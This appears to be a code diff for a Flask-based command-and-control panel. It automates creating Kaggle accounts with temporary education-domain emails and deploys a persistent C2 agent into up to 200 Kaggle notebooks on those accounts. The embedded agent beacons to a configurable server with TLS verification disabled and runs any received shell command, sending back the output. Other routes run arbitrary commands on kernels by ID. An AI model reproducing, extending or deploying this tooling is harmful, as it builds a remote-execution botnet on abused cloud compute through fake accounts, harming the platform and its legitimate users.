+            batch_dataset_progress["running"] = False
+            return
+        
+        for i, acc in enumerate(have_keys):
+            if not batch_dataset_progress["running"]:
+                add_log("Batch cancelled")
+                break
+            
+            email = acc.get("email", "")
+            api_key = acc.get("api_key", "")
+            username = acc.get("kaggle_username", "")
+            
+            batch_dataset_progress["current_email"] = email
+            
+            add_log(f"[{i+1}/{len(have_keys)}] Processing: {username}")
+            
+            result = create_dataset_with_machines(api_key, username, num_machines=5, log_fn=add_log)
+            
+            # Save machines info
+            if result.get("machines_created", 0) > 0:
+                account_store.update(acc["reg_id"], {
+                    "dataset": result.get("dataset"),
+                    "machines": result.get("machines", []),
+                    "machines_created": result.get("machines_created", 0)
+                })
+            
+            if result.get("success"):
+                batch_dataset_progress["success"] += 1
+                add_log(f"✓ Created {result.get('machines_created', 0)} kernels")
+            else:
+                batch_dataset_progress["failed"] += 1
+                add_log(f"✗ Failed: {result.get('error', 'unknown')}")
+            
+            batch_dataset_progress["processed"] = i + 1
+            time.sleep(1)
+        
+        batch_dataset_progress["running"] = False
+        batch_dataset_progress["current_email"] = ""
+        add_log(f"Batch complete: {batch_dataset_progress['success']} success, {batch_dataset_progress['failed']} failed")
+        log_event("batch_datasets", f"{batch_dataset_progress['success']}/{batch_dataset_progress['total']}")
+    
+    threading.Thread(target=do_batch, daemon=True).start()
+    
+    return jsonify({
+        "status": "started",
+        "total": len(have_keys)
+    })
+
+@app.route("/api/autoreg/batch-datasets-progress")
+@login_required
+def get_batch_dataset_progress():
+    """Get current progress of batch dataset creation."""
+    return jsonify(batch_dataset_progress)
+
+@app.route("/api/autoreg/batch-datasets-cancel", methods=["POST"])
+@login_required
+def cancel_batch_datasets():
+    """Cancel batch dataset creation."""
+    global batch_dataset_progress
+    batch_dataset_progress["running"] = False
+    return jsonify({"status": "cancelled"})
+
+# ──────────────────────── BATCH JOIN C2 ────────────────────────
+
+KAGGLE_C2_AGENT_CODE = '''import os,sys,json,time,socket,platform,subprocess,hashlib,threading
+import urllib3
+urllib3.disable_warnings()
+try: import requests
+except: requests=None
+C2_URL="{c2_url}"
+KERNEL_SLUG="{kernel_slug}"
+AGENT_ID=hashlib.sha256(("kaggle:"+KERNEL_SLUG).encode()).hexdigest()[:16]
+def _post(path,data):
+    for _ in range(5):
+        try:
+            if requests:
+                r=requests.post(C2_URL+path,json=data,timeout=25,verify=False)
+                return r.json() if r.ok else {{"tasks":[]}}
+            import urllib.request
+            req=urllib.request.Request(C2_URL+path,data=json.dumps(data).encode(),headers={{"Content-Type":"application/json"}})
+            import ssl
+            ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
+            return json.loads(urllib.request.urlopen(req,timeout=25,context=ctx).read())
+        except Exception: time.sleep(3)
+    return {{"tasks":[]}}
+def register():
+    info={{"id":AGENT_ID,"hostname":"kaggle-"+KERNEL_SLUG.replace("/","-"),"username":os.popen("whoami").read().strip(),"os":"Kaggle "+platform.system(),"arch":platform.machine(),"ip_internal":socket.gethostname(),"platform_type":"kaggle"}}
+    return _post("/api/agent/register",info)
+def beacon():
+    while True:
+        try:
+            r=_post("/api/agent/beacon",{{"id":AGENT_ID}})
+            for t in r.get("tasks",[]):
+                out=subprocess.check_output(t.get("payload",""),shell=True,stderr=subprocess.STDOUT,timeout=300).decode(errors="replace")
+                _post("/api/agent/result",{{"task_id":t["id"],"result":out[:65000]}})
+        except: pass
+        time.sleep(5)
+register()
+threading.Thread(target=beacon,daemon=True).start()
+while True: time.sleep(60)
+'''
+
+batch_join_c2_progress = {
+    "running": False,
+    "total": 0,
+    "processed": 0,
+    "success": 0,
+    "failed": 0,
+    "current": "",
+    "logs": []
+}
+
+def _get_account_kernels(username: str, api_key: str) -> list:
+    """Get list of kernel slugs for account via kaggle kernels list --mine."""
+    import subprocess as _sp
+    from pathlib import Path
+    kaggle_dir = Path.home() / ".kaggle"
+    kaggle_dir.mkdir(parents=True, exist_ok=True)
+    (kaggle_dir / "kaggle.json").write_text(json.dumps({"username": username, "key": api_key}))
+    (kaggle_dir / "kaggle.json").chmod(0o600)
+    try:
+        r = _sp.run(["kaggle", "kernels", "list", "--mine"], capture_output=True, text=True, timeout=30)
+        if r.returncode != 0:
+            return []
+        slugs = []
+        for line in r.stdout.strip().split("\n")[2:]:
+            parts = line.split()
+            if parts and "/" in parts[0]:
+                slugs.append(parts[0].strip())
+        return slugs
+    except Exception:
+        return []
+
+def _deploy_code_to_kernel(username: str, api_key: str, kernel_slug: str, code: str) -> bool:
+    """Deploy code to Kaggle kernel via CLI. Returns True on success."""
+    import subprocess as _sp
+    import tempfile
+    from pathlib import Path
+    kaggle_dir = Path.home() / ".kaggle"
+    kaggle_dir.mkdir(parents=True, exist_ok=True)
+    (kaggle_dir / "kaggle.json").write_text(json.dumps({"username": username, "key": api_key}))
+    (kaggle_dir / "kaggle.json").chmod(0o600)
+    try:
+        with tempfile.TemporaryDirectory() as tmpdir:
+            tmp = Path(tmpdir)
+            r = _sp.run(["kaggle", "kernels", "pull", kernel_slug, "-p", tmpdir, "-m"], capture_output=True, text=True, timeout=60)
+            if r.returncode != 0:
+                return False
+            nb_files = list(tmp.glob("*.ipynb"))
+            if not nb_files:
+                return False
+            nb = json.loads(nb_files[0].read_text())
+            lines = [line + "\n" for line in code.split("\n")]
+            nb["cells"] = [{"cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [], "source": lines}]
+            nb_files[0].write_text(json.dumps(nb, indent=2))
+            meta_path = tmp / "kernel-metadata.json"
+            meta = json.loads(meta_path.read_text()) if meta_path.exists() else {}
+            meta.update({
+                "id": kernel_slug,
+                "title": kernel_slug.split("/")[-1].replace("-", " "),
+                "code_file": nb_files[0].name,
+                "language": "python",
+                "kernel_type": "notebook",
+                "is_private": True,
+                "enable_gpu": True,
+                "enable_tpu": False,
+                "enable_internet": True,
+            })
+            meta.setdefault("dataset_sources", [])
+            meta.setdefault("competition_sources", [])
+            meta.setdefault("kernel_sources", [])
+            meta.setdefault("model_sources", [])
+            meta_path.write_text(json.dumps(meta, indent=2))
+            r2 = _sp.run(["kaggle", "kernels", "push", "-p", tmpdir], capture_output=True, text=True, timeout=120)
+            return r2.returncode == 0
+    except Exception:
+        return False
+
+@app.route("/api/autoreg/batch-join-c2", methods=["POST"])
+@login_required
+def batch_join_c2():
+    """Deploy C2 agent to all Kaggle machines - persistent connection."""
+    global batch_join_c2_progress
+    if batch_join_c2_progress["running"]:
+        return jsonify({"error": "Batch already running"}), 400
+    c2_url = _get_kaggle_c2_url()
+    if not c2_url:
+        return jsonify({"error": "No C2 URL configured. Set Public URL in Settings."}), 400
+    c2_url = c2_url.rstrip("/")
+    accounts = account_store.get_all()
+    targets = []
+    for a in accounts:
+        if a.get("platform") != "kaggle" or not a.get("api_key_legacy"):
+            continue
+        username = a.get("kaggle_username") or a.get("username", "")
+        if not username:
+            continue
+        api_key = a.get("api_key_legacy")
+        slugs = _get_account_kernels(username, api_key)
+        if not slugs:
+            slugs = [m.get("slug", m) for m in (a.get("machines") or []) if isinstance(m, dict) and m.get("slug") or (isinstance(m, str) and m)]
+        for slug in slugs:
+            if slug:
+                targets.append({"reg_id": a["reg_id"], "email": a.get("email", ""), "username": username, "api_key": api_key, "kernel_slug": slug})
+    if not targets:
+        return jsonify({"error": "No Kaggle machines with API keys found"}), 400
+    if len(targets) > 200:
+        targets = targets[:200]
+        log_event("batch_join_c2", f"Limited to 200 machines (total was {len(account_store.get_all())})")
+    batch_join_c2_progress = {
+        "running": True,
+        "total": len(targets),
+        "processed": 0,
+        "success": 0,
+        "failed": 0,
+        "current": "",
+        "logs": []
+    }
+    agent_code_tpl = KAGGLE_C2_AGENT_CODE
+
+    def _log(msg):
+        batch_join_c2_progress["logs"].append(msg)
+        if len(batch_join_c2_progress["logs"]) > 100:
+            batch_join_c2_progress["logs"] = batch_join_c2_progress["logs"][-100:]
+        print(msg)
+
+    def _run():
+        global batch_join_c2_progress
+        for i, t in enumerate(targets):
+            if not batch_join_c2_progress["running"]:
+                _log("Cancelled")
+                break
+            batch_join_c2_progress["current"] = f"{t['email']} / {t['kernel_slug']}"
+            _log(f"[{i+1}/{len(targets)}] Deploying to {t['kernel_slug']}...")
+            try:
+                code = agent_code_tpl.format(c2_url=c2_url, kernel_slug=t["kernel_slug"])
+                ok = _deploy_code_to_kernel(t["username"], t["api_key"], t["kernel_slug"], code)
+                if ok:
+                    batch_join_c2_progress["success"] += 1
+                    _log(f"  ✓ Deployed")
+                else:
+                    batch_join_c2_progress["failed"] += 1
+                    _log(f"  ✗ Deploy failed")
+            except Exception as e:
+                batch_join_c2_progress["failed"] += 1
+                _log(f"  ✗ {e}")
+            batch_join_c2_progress["processed"] = i + 1
+            time.sleep(1)
+        batch_join_c2_progress["running"] = False
+        batch_join_c2_progress["current"] = ""
+        _log(f"Done: {batch_join_c2_progress['success']} ok, {batch_join_c2_progress['failed']} failed")
+        log_event("batch_join_c2", f"{batch_join_c2_progress['success']}/{batch_join_c2_progress['total']}")
+
+    threading.Thread(target=_run, daemon=True).start()
+    return jsonify({"status": "started", "total": len(targets)})
+
+@app.route("/api/autoreg/batch-join-c2-progress")
+@login_required
+def get_batch_join_c2_progress():
+    return jsonify(batch_join_c2_progress)
+
+@app.route("/api/autoreg/batch-join-c2-cancel", methods=["POST"])
+@login_required
+def cancel_batch_join_c2():
+    global batch_join_c2_progress
+    batch_join_c2_progress["running"] = False
+    return jsonify({"status": "cancelled"})
+
+# ──────────────────────── API: LABORATORY ────────────────────────
+
+# Lab data storage
+LAB_DATA = {
+    "experiments": [],
+    "library": []
+}
+
+def load_lab_data():
+    """Load laboratory data from file."""
+    global LAB_DATA
+    lab_file = BASE_DIR / "data" / "lab_data.json"
+    if lab_file.exists():
+        try:
+            LAB_DATA = json.loads(lab_file.read_text())
+        except:
+            pass
+
+def save_lab_data():
+    """Save laboratory data to file."""
+    lab_file = BASE_DIR / "data" / "lab_data.json"
+    lab_file.write_text(json.dumps(LAB_DATA, indent=2))
+
+@app.route("/api/lab/set-test-account", methods=["POST"])
+@login_required
+def lab_set_test_account():
+    """Mark account as test account for laboratory."""
+    data = request.json
+    reg_id = data.get("reg_id")
+    
+    if not reg_id:
+        return jsonify({"error": "Missing reg_id"}), 400
+    
+    # Clear previous test account
+    accounts = account_store.get_all()
+    for acc in accounts:
+        if acc.get("lab_status") == "testing":
+            account_store.update(acc["reg_id"], {"lab_status": None})
+    
+    # Set new test account
+    account_store.update(reg_id, {"lab_status": "testing"})
+    
+    return jsonify({"status": "ok", "message": "Account marked as test account"})
+
+@app.route("/api/lab/clear-test-account", methods=["POST"])
+@login_required
+def lab_clear_test_account():
+    """Clear test account status."""
+    data = request.json
+    reg_id = data.get("reg_id")
+    
+    if reg_id:
+        account_store.update(reg_id, {"lab_status": None})
+    
+    return jsonify({"status": "ok"})
+
+@app.route("/api/lab/machine/status", methods=["POST"])
+@login_required
+def lab_machine_status():
+    """Get kernel/machine status via Kaggle API."""
+    data = request.json
+    username = data.get("username")
+    api_key = data.get("api_key")
+    kernel_slug = data.get("kernel_slug")
+    
+    if not all([username, api_key, kernel_slug]):
+        return jsonify({"error": "Missing required fields"}), 400
+    
+    # Convert slug format: underscores to dashes
+    kernel_slug = kernel_slug.replace("_", "-")
+    
+    try:
+        import subprocess
+        import tempfile
+        import json
+        from pathlib import Path
+        
+        # Setup kaggle credentials
+        kaggle_dir = Path.home() / ".kaggle"
+        kaggle_dir.mkdir(parents=True, exist_ok=True)
+        kaggle_json = kaggle_dir / "kaggle.json"
+        kaggle_json.write_text(json.dumps({"username": username, "key": api_key}))
+        kaggle_json.chmod(0o600)
+        
+        # Get actual kernel status via kaggle kernels status
+        result = subprocess.run(
+            ["kaggle", "kernels", "status", kernel_slug],
+            capture_output=True, text=True, timeout=30
+        )
+        
+        # Parse status from output like "slug has status KernelWorkerStatus.RUNNING"
+        status_text = result.stdout.strip()
+        if "COMPLETE" in status_text:
+            status = "complete"
+        elif "RUNNING" in status_text:
+            status = "running"
+        elif "QUEUED" in status_text:
+            status = "queued"
+        elif "ERROR" in status_text:
+            status = "error"
+        elif result.returncode != 0:
+            status = "not_found"
+        else:
+            status = "unknown"
+            
+        return jsonify({"status": status, "slug": kernel_slug, "raw": status_text})
+        
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+@app.route("/api/lab/machine/deploy", methods=["POST"])
+@login_required
+def lab_machine_deploy():
+    """Deploy code to a Kaggle kernel."""
+    data = request.json
+    username = data.get("username")
+    api_key = data.get("api_key")
+    kernel_slug = data.get("kernel_slug")
+    code = data.get("code")
+    
+    if not all([username, api_key, kernel_slug, code]):
+        return jsonify({"error": "Missing required fields"}), 400
+    
+    # Convert slug format: underscores to dashes
+    kernel_slug = kernel_slug.replace("_", "-")
+    
+    try:
+        import subprocess
+        import tempfile
+        import json
+        from pathlib import Path
+        
+        # Setup kaggle credentials
+        kaggle_dir = Path.home() / ".kaggle"
+        kaggle_dir.mkdir(parents=True, exist_ok=True)
+        kaggle_json = kaggle_dir / "kaggle.json"
+        kaggle_json.write_text(json.dumps({"username": username, "key": api_key}))
+        kaggle_json.chmod(0o600)
+        
+        # Pull existing kernel
+        with tempfile.TemporaryDirectory() as tmpdir:
+            tmpdir_path = Path(tmpdir)
+            
+            # Pull kernel files
+            pull_result = subprocess.run(
+                ["kaggle", "kernels", "pull", kernel_slug, "-p", tmpdir],
+                capture_output=True, text=True, timeout=60
+            )
+            
+            if pull_result.returncode != 0:
+                return jsonify({"error": f"Pull failed: {pull_result.stderr[:200]}"}), 500
+            
+            # Find notebook file
+            notebook_files = list(tmpdir_path.glob("*.ipynb"))
+            if not notebook_files:
+                return jsonify({"error": "No notebook found"}), 500
+            
+            notebook_path = notebook_files[0]
+            notebook = json.loads(notebook_path.read_text())
+            
+            # Replace first cell with new code (cleaner than appending)
+            # Each line in source array must end with \n for proper notebook format
+            code_lines = [line + "\n" for line in code.split("\n")]
+            new_cell = {
+                "cell_type": "code",
+                "execution_count": None,
+                "metadata": {},
+                "outputs": [],
+                "source": code_lines
+            }
+            notebook["cells"] = [new_cell]  # Replace all cells with just this one
+            notebook_path.write_text(json.dumps(notebook, indent=2))
+            
+            # Create kernel-metadata.json for push
+            kernel_title = kernel_slug.split("/")[-1].replace("-", " ")
+            metadata = {
+                "id": kernel_slug,
+                "title": kernel_title,
+                "code_file": notebook_path.name,
+                "language": "python",
+                "kernel_type": "notebook",
+                "is_private": True,
+                "enable_gpu": True,
+                "enable_tpu": False,
+                "enable_internet": True,
+                "dataset_sources": [],
+                "competition_sources": [],
+                "kernel_sources": [],
+                "model_sources": []
+            }
+            metadata_path = tmpdir_path / "kernel-metadata.json"
+            metadata_path.write_text(json.dumps(metadata, indent=2))
+            
+            # Push updated kernel
+            push_result = subprocess.run(
+                ["kaggle", "kernels", "push", "-p", tmpdir],
+                capture_output=True, text=True, timeout=120
+            )
+            
+            if push_result.returncode != 0:
+                return jsonify({"error": f"Push failed: {push_result.stdout[:200] or push_result.stderr[:200]}"}), 500
+            
+            return jsonify({
+                "status": "deployed",
+                "kernel": kernel_slug,
+                "message": push_result.stdout[:200] if push_result.stdout else "OK"
+            })
+            
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+@app.route("/api/lab/machine/output", methods=["POST"])
+@login_required
+def lab_machine_output():
+    """Get output from a Kaggle kernel."""
+    data = request.json
+    username = data.get("username")
+    api_key = data.get("api_key")
+    kernel_slug = data.get("kernel_slug")
+    
+    if not all([username, api_key, kernel_slug]):
+        return jsonify({"error": "Missing required fields"}), 400
+    
+    # Convert slug format: underscores to dashes
+    kernel_slug = kernel_slug.replace("_", "-")
+    
+    try:
+        import subprocess
+        import tempfile
+        import json
+        from pathlib import Path
+        
+        # Setup kaggle credentials
+        kaggle_dir = Path.home() / ".kaggle"
+        kaggle_dir.mkdir(parents=True, exist_ok=True)
+        kaggle_json = kaggle_dir / "kaggle.json"
+        kaggle_json.write_text(json.dumps({"username": username, "key": api_key}))
+        kaggle_json.chmod(0o600)
+        
+        # Get kernel output
+        with tempfile.TemporaryDirectory() as tmpdir:
+            result = subprocess.run(
+                ["kaggle", "kernels", "output", kernel_slug, "-p", tmpdir],
+                capture_output=True, text=True, timeout=60
+            )
+            
+            if result.returncode != 0:
+                return jsonify({"error": result.stderr[:200] or "Output not ready"}), 500
+            
+            # Parse output files - Kaggle logs are JSON arrays
+            output_lines = []
+            for f in Path(tmpdir).glob("*.log"):
+                try:
+                    content = f.read_text().strip()
+                    # Try parsing as JSON array first
+                    if content.startswith('['):
+                        try:
+                            entries = json.loads(content)
+                            for entry in entries:
+                                if entry.get('stream_name') == 'stdout':
+                                    output_lines.append(entry.get('data', ''))
+                        except:
+                            pass
+                    else:
+                        # Fall back to line-by-line parsing
+                        for line in content.split('\n'):
+                            if line.strip().startswith('{'):
+                                try:
+                                    entry = json.loads(line.rstrip(','))
+                                    if entry.get('stream_name') == 'stdout':
+                                        output_lines.append(entry.get('data', ''))
+                                except:
+                                    pass
+                except:
+                    pass
+            
+            # Also check other output files
+            for f in Path(tmpdir).iterdir():
+                if f.is_file() and f.suffix not in ['.log', '.ipynb']:
+                    try:
+                        output_lines.append(f.read_text()[:1000])
+                    except:
+                        pass
+            
+            return jsonify({
+                "status": "success",
+                "output": ''.join(output_lines),
+                "kernel": kernel_slug
+            })
+            
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+@app.route("/api/lab/experiments/list")
+@login_required
+def lab_experiments_list():
+    """List all experiments."""
+    load_lab_data()
+    return jsonify({"experiments": LAB_DATA.get("experiments", [])})
+
+@app.route("/api/lab/experiments/create", methods=["POST"])
+@login_required
+def lab_experiments_create():
+    """Create a new experiment."""
+    load_lab_data()
+    data = request.json
+    
+    import uuid
+    from datetime import datetime
+    
+    experiment = {
+        "id": str(uuid.uuid4())[:8],
+        "name": data.get("name", "Untitled"),
+        "code": data.get("code", ""),
+        "target_machines": data.get("target_machines", "all"),
+        "status": "pending",
+        "created": datetime.now().isoformat(),
+        "results": []
+    }
+    
+    LAB_DATA.setdefault("experiments", []).append(experiment)
+    save_lab_data()
+    
+    return jsonify({"status": "ok", "experiment": experiment})
+
+@app.route("/api/lab/experiments/<exp_id>/run", methods=["POST"])
+@login_required
+def lab_experiments_run(exp_id):
+    """Run an experiment."""
+    load_lab_data()
+    
+    for exp in LAB_DATA.get("experiments", []):
+        if exp["id"] == exp_id:
+            exp["status"] = "running"
+            save_lab_data()
+            return jsonify({"status": "ok"})
+    
+    return jsonify({"error": "Experiment not found"}), 404
+
+@app.route("/api/lab/library/list")
+@login_required
+def lab_library_list():
+    """List saved scripts."""
+    load_lab_data()
+    return jsonify({"scripts": LAB_DATA.get("library", [])})
+
+@app.route("/api/lab/library/save", methods=["POST"])
+@login_required
+def lab_library_save():
+    """Save a script to library."""
+    load_lab_data()
+    data = request.json
+    
+    import uuid
+    from datetime import datetime
+    
+    script = {
+        "id": str(uuid.uuid4())[:8],
+        "name": data.get("name", "Untitled"),
+        "code": data.get("code", ""),
+        "created": datetime.now().isoformat()
+    }
+    
+    LAB_DATA.setdefault("library", []).append(script)
+    save_lab_data()
+    
+    return jsonify({"status": "ok", "script": script})
+
+@app.route("/api/lab/library/import", methods=["POST"])
+@login_required
+def lab_library_import():
+    """Import scripts from JSON."""
+    load_lab_data()
+    data = request.json
+    
+    scripts = data.get("scripts", [])
+    for s in scripts:
+        if "id" not in s:
+            import uuid
+            s["id"] = str(uuid.uuid4())[:8]
+        LAB_DATA.setdefault("library", []).append(s)
+    
+    save_lab_data()
+    return jsonify({"status": "ok", "imported": len(scripts)})
+
+@app.route("/api/tunnel/url")
+@login_required
+def tunnel_url():
+    """Get the current tunnel URL."""
+    return jsonify({"url": PUBLIC_URL.get("url", "")})
 
 # ──────────────────────── API: LIVE VIEW ────────────────────────
 
@@ -581,7 +2115,7 @@ def serve_screenshot(filename):
 @login_required
 def tempmail_domains():
     try:
-        domains = boomlify_get_domains(edu_only=False)
+        domains = boomlify_get_domains(edu_only=True)
         return jsonify(domains)
     except Exception as e:
         return jsonify({"error": str(e)}), 500
@@ -592,8 +2126,8 @@ def tempmail_create():
     data = request.get_json(silent=True) or {}
     domain_name = data.get("domain", None)
     try:
-        email_data = mail_manager.create_email(domain_name=domain_name)
-        log_event("tempmail_create", f"{email_data['email']} via boomlify")
+        email_data = mail_manager.create_email(domain_name=domain_name, edu_only=True)
+        log_event("tempmail_create", f"{email_data['email']} via {email_data.get('provider','?')}")
         safe = {k: v for k, v in email_data.items() if k != "_api_data"}
         return jsonify(safe)
     except Exception as e:
@@ -620,9 +2154,11 @@ def tempmail_extract():
     email = request.args.get("email", "")
     msg_id = request.args.get("msg_id", "")
     msg = mail_manager.get_message(email, msg_id)
-    text = msg.get("body", "") or msg.get("html", "")
+    body = msg.get("body", "") or ""
+    html = msg.get("html", "") or ""
+    text = body + "\n" + html
     code = mail_manager.extract_code(text)
-    link = mail_manager.extract_link(msg.get("html", "") or text)
+    link = mail_manager.extract_link(html or body)
     return jsonify({"code": code, "link": link})
 
 @app.route("/api/tempmail/accounts")
@@ -668,7 +2204,8 @@ def serve_agent(filename):
     fpath = agents_dir / filename
     if fpath.exists() and fpath.is_file():
         content = fpath.read_text()
-        server_url = f"{request.scheme}://{request.host}"
+        # Use public_url for agents so they connect via external address
+        server_url = _get_public_url() or f"{request.scheme}://{request.host}"
         content = content.replace("http://CHANGE_ME:443", server_url)
         return Response(content, mimetype="text/plain")
     return "Not found", 404
@@ -831,6 +2368,1075 @@ def broadcast_task():
     log_event("broadcast", f"{task_type}: {payload[:80]} -> {len(agents)} agents ({target})")
     return jsonify({"status": "ok", "count": len(agents)})
 
+# ═══════════════════════════════════════════════════════════════
+# KAGGLE C2 TRANSPORT API
+# ═══════════════════════════════════════════════════════════════
+
+def get_kaggle_manager():
+    """Get or create Kaggle C2 manager."""
+    global kaggle_c2_manager
+    if not KAGGLE_C2_AVAILABLE:
+        return None
+    if kaggle_c2_manager is None:
+        kaggle_c2_manager = KaggleC2Manager(
+            accounts_file=str(BASE_DIR / "data" / "accounts.json"),
+            log_fn=lambda msg: log_event("kaggle_c2", msg)
+        )
+        kaggle_c2_manager.load_accounts()
+    return kaggle_c2_manager
+
+@app.route("/api/kaggle/agents", methods=["GET"])
+@login_required
+def kaggle_list_agents():
+    """List all Kaggle agents."""
+    manager = get_kaggle_manager()
+    if not manager:
+        return jsonify({"error": "Kaggle C2 not available"}), 503
+    return jsonify({"agents": manager.list_agents()})
+
+@app.route("/api/kaggle/setup", methods=["POST"])
+@login_required
+def kaggle_setup_agent():
+    """Setup dataset and kernel for a Kaggle agent."""
+    manager = get_kaggle_manager()
+    if not manager:
+        return jsonify({"error": "Kaggle C2 not available"}), 503
+    
+    data = request.get_json(silent=True) or {}
+    username = data.get("username")
+    
+    if not username:
+        return jsonify({"error": "username required"}), 400
+    
+    transport = manager.get_agent(username)
+    if not transport:
+        return jsonify({"error": "agent not found"}), 404
+    
+    success = transport.setup()
+    return jsonify({"status": "ok" if success else "error", "username": username})
+
+@app.route("/api/kaggle/exec", methods=["POST"])
+@login_required
+def kaggle_exec():
+    """Execute command on Kaggle agent and wait for result."""
+    manager = get_kaggle_manager()
+    if not manager:
+        return jsonify({"error": "Kaggle C2 not available"}), 503
+    
+    data = request.get_json(silent=True) or {}
+    username = data.get("username")
+    cmd_type = data.get("type", "shell")
+    payload = data.get("payload")
+    timeout = data.get("timeout", 300)
+    
+    if not username or not payload:
+        return jsonify({"error": "username and payload required"}), 400
+    
+    transport = manager.get_agent(username)
+    if not transport:
+        return jsonify({"error": "agent not found"}), 404
+    
+    result = transport.quick_command(cmd_type, payload, timeout=timeout)
+    
+    if result:
+        log_event("kaggle_exec", f"{username}: {cmd_type} -> {result.get('status')}")
+        return jsonify({"status": "ok", "result": result})
+    else:
+        return jsonify({"status": "error", "error": "no result or timeout"})
+
+@app.route("/api/kaggle/batch", methods=["POST"])
+@login_required
+def kaggle_batch():
+    """Execute multiple commands on Kaggle agent."""
+    manager = get_kaggle_manager()
+    if not manager:
+        return jsonify({"error": "Kaggle C2 not available"}), 503
+    
+    data = request.get_json(silent=True) or {}
+    username = data.get("username")
+    commands = data.get("commands", [])
+    timeout = data.get("timeout", 300)
+    
+    if not username or not commands:
+        return jsonify({"error": "username and commands required"}), 400
+    
+    transport = manager.get_agent(username)
+    if not transport:
+        return jsonify({"error": "agent not found"}), 404
+    
+    result = transport.execute_and_wait(commands, timeout=timeout)
+    
+    if result:
+        log_event("kaggle_batch", f"{username}: {len(commands)} commands")
+        return jsonify({"status": "ok", "result": result})
+    else:
+        return jsonify({"status": "error", "error": "no result or timeout"})
+
+@app.route("/api/kaggle/status", methods=["GET"])
+@login_required
+def kaggle_status():
+    """Check kernel status for a Kaggle agent."""
+    manager = get_kaggle_manager()
+    if not manager:
+        return jsonify({"error": "Kaggle C2 not available"}), 503
+    
+    username = request.args.get("username")
+    if not username:
+        return jsonify({"error": "username required"}), 400
+    
+    transport = manager.get_agent(username)
+    if not transport:
+        return jsonify({"error": "agent not found"}), 404
+    
+    status = transport.get_kernel_status()
+    return jsonify({"username": username, "status": status})
+
+@app.route("/api/kaggle/results", methods=["GET"])
+@login_required
+def kaggle_results():
+    """Get results from last kernel run."""
+    manager = get_kaggle_manager()
+    if not manager:
+        return jsonify({"error": "Kaggle C2 not available"}), 503
+    
+    username = request.args.get("username")
+    if not username:
+        return jsonify({"error": "username required"}), 400
+    
+    transport = manager.get_agent(username)
+    if not transport:
+        return jsonify({"error": "agent not found"}), 404
+    
+    results = transport.get_results()
+    
+    if results:
+        return jsonify({"status": "ok", "results": results})
+    else:
+        return jsonify({"status": "error", "error": "no results"})
+
+@app.route("/api/kaggle/setup_all", methods=["POST"])
+@login_required
+def kaggle_setup_all():
+    """Setup all Kaggle agents."""
+    manager = get_kaggle_manager()
+    if not manager:
+        return jsonify({"error": "Kaggle C2 not available"}), 503
+    
+    results = manager.setup_all()
+    success_count = sum(1 for v in results.values() if v)
+    
+    return jsonify({
+        "status": "ok",
+        "total": len(results),
+        "success": success_count,
+        "results": results
+    })
+
+# ==================== KERNEL MANAGEMENT BY ID ====================
+
+@app.route("/api/kaggle/kernel/exec", methods=["POST"])
+@login_required
+def kaggle_kernel_exec():
+    """Execute command on specific kernel by ID (kaggle-{username}-agent{N})."""
+    data = request.get_json(silent=True) or {}
+    kernel_id = data.get("kernel_id")  # e.g. "kaggle-username-agent1"
+    command = data.get("command")
+    
+    if not kernel_id or not command:
+        return jsonify({"error": "kernel_id and command required"}), 400
+    
+    # Parse kernel_id: kaggle-{username}-agent{N}
+    parts = kernel_id.replace("kaggle-", "").rsplit("-agent", 1)
+    if len(parts) != 2:
+        return jsonify({"error": "invalid kernel_id format"}), 400
+    
+    username, kernel_num = parts
+    kernel_num = int(kernel_num)
+    
+    # Get account
+    accounts = account_store.get_all()
+    account = None
+    for a in accounts:
+        if a.get("kaggle_username") == username:
+            account = a
+            break
+    
+    if not account:
+        return jsonify({"error": f"account {username} not found"}), 404
+    
+    api_key = account.get("api_key")
+    if not api_key:
+        return jsonify({"error": "no api_key for account"}), 400
+    
+    # Push kernel with command (async - don't wait)
+    import tempfile
+    from pathlib import Path
+    
+    kernel_slug = f"{username}/c2-agent-{kernel_num}"
+    
+    try:
+        with tempfile.TemporaryDirectory() as tmpdir:
+            tmpdir_path = Path(tmpdir)
+            
+            # Kernel metadata
+            metadata = {
+                "id": kernel_slug,
+                "title": f"C2 Agent {kernel_num}",
+                "code_file": "notebook.ipynb",
+                "language": "python",
+                "kernel_type": "notebook",
+                "is_private": True,
+                "enable_gpu": True,
+                "enable_internet": True
+            }
+            (tmpdir_path / "kernel-metadata.json").write_text(json.dumps(metadata, indent=2))
+            
+            # Notebook with command
+            notebook = {
+                "cells": [{
+                    "cell_type": "code",
+                    "execution_count": None,
+                    "metadata": {},
+                    "outputs": [],
+                    "source": [
+                        "import subprocess, json\n",
+                        f"cmd = {json.dumps(command)}\n",
+                        "print(f'[EXEC] {cmd}', flush=True)\n",
+                        "r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)\n",
+                        "print(json.dumps({'returncode': r.returncode, 'stdout': r.stdout, 'stderr': r.stderr}), flush=True)\n"
+                    ]
+                }],
+                "metadata": {"kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"}},
+                "nbformat": 4, "nbformat_minor": 4
+            }
+            (tmpdir_path / "notebook.ipynb").write_text(json.dumps(notebook, indent=2))
+            
+            # Push
+            result = subprocess.run(
+                ["kaggle", "kernels", "push", "-p", tmpdir],
+                capture_output=True, text=True, timeout=60,
+                env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
+            )
+            
+            if result.returncode == 0 or "successfully" in result.stdout.lower():
+                log_event("kaggle_kernel_exec", f"{kernel_id}: {command[:50]}")
+                return jsonify({
+                    "status": "started", 
+                    "kernel": kernel_slug,
+                    "message": "Kernel pushed, check status/results in 1-2 minutes"
+                })
+            else:
+                return jsonify({"status": "error", "error": result.stderr[:200]})
+                
+    except Exception as e:
+        return jsonify({"status": "error", "error": str(e)})
+
+@app.route("/api/kaggle/kernel/status", methods=["POST"])
+@login_required
+def kaggle_kernel_status():
+    """Get status of specific kernel."""
+    data = request.get_json(silent=True) or {}
+    kernel_id = data.get("kernel_id")
+    
+    if not kernel_id:
+        return jsonify({"error": "kernel_id required"}), 400
+    
+    parts = kernel_id.replace("kaggle-", "").rsplit("-agent", 1)
+    if len(parts) != 2:
+        return jsonify({"error": "invalid kernel_id format"}), 400
+    
+    username, kernel_num = parts
+    
+    # Get account credentials
+    accounts = account_store.get_all()
+    account = None
+    for a in accounts:
